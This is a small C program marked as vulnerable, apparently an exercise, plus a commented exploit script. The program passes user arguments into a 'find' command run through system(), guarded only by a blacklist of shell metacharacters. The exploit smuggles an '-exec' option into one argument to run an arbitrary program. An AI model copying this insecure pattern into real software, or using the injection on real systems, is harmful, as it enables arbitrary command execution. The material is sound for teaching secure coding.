// program.c (vulnerable)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char buf[1024];
    int escaped, i, j;

    if (argc < 2) {
        fprintf(stderr, "Not enough args\n");
        return 1;
    }

    for (i = 1; i < argc; i++) {
        escaped = 0;
        for (j = 0; j < strlen(argv[i]); j++) {
            switch (argv[i][j]) {
            case '\\':
                escaped = !escaped;
                break;
            case '&':
            case '>':
            case '<':
            case '`':
            case ';':
            case '|':
                if (!escaped) {
                    fprintf(stderr, "Input contains prohibited characters\n");
                    return 2;
                }
                /* fall through */
            default:
                escaped = 0;
                break;
            }
        }
    }

    for (i = 1; i < argc; i++) {
        snprintf(buf, 1023, "/usr/bin/find ~ -iname %s", argv[i]);
        system(buf);
    }

    exit(0);
}

// exploit.sh
// #!/bin/bash
// touch file.c
// /path/to/program "file.c -exec ../../../path/to/malicious/program '{}' \+"
